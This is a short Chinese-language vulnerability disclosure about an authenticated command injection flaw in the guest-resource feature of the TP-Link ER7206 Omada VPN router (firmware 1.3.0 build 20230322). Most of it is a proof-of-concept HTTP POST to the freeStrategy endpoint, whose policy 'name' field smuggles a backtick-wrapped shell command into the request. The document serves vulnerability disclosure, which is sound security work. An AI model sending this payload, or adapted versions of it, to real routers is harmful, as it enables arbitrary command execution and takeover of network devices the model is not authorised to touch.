## TP-Link-ER7206存在命令注入漏洞

Tp-Link ER7206 Omada Gigabit VPN Router 1.3.0 build 20230322 Rel.70591 的访客资源功能中存在命令执行漏洞。特制的 HTTP 请求可能导致任意命令执行。攻击者可以发出经过身份验证的 HTTP 请求来触发此漏洞


## poc
```
POST /cgi-bin/luci/;stok=b53d9dc12fe8aa66f4fdc273e6eaa534/admin/freeStrategy?form=strategy_list HTTP/1.1
Host: 192.168.8.100
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Cookie: sysauth=8701fa9dc1908978bc804e7d08931706
Content-Length: 470

data=%7B%22method%22%3A%22add%22%2C%22params%22%3A%7B%22index%22%3A0%2C%22old%22%3A%22add%22%2C%22new%22%3A%7B%22name%22%3A%22DDDDL|`/usr/bin/id>/tmp/had`%22%2C%22strategy_type%22%3A%22five_tuple%22%2C%22src_ipset%22%3A%22%2F%22%2C%22dst_ipset%22%3A%22%2F%22%2C%22mac%22%3A%22%22%2C%22sport%22%3A%22-%22%2C%22dport%22%3A%22-%22%2C%22service_type%22%3A%22TCP%22%2C%22zone%22%3A%22LAN1%22%2C%22comment%22%3A%22%22%2C%22enable%22%3A%22on%22%7D%2C%22key%22%3A%22add%22%7D%7D 
```
